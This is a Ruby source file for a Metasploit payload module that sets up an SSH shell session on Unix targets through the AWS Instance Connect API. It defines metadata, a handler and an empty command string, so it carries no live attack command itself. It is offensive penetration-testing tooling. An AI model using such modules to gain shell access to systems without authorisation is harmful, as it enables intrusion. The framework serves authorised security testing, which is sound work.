##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 70

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Unix SSH Shell, Bind Instance Connect (via AWS API)',
        'Description' => 'Creates an ssh shell using AWS Instance Connect',
        'Author' => 'RageLtMan <rageltman[at]sempervictus>',
        'References' => ['URL', 'https://www.sempervictus.com/single-post/a-serial-case-of-air-on-the-side-channel'],
        'License' => MSF_LICENSE,
        'Platform' => 'unix',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::BindAwsInstanceConnect,
        'Session' => Msf::Sessions::AwsInstanceConnectBind,
        'PayloadType' => 'ssh_interact',
        'RequiredCmd' => 'generic',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    ''
  end
end
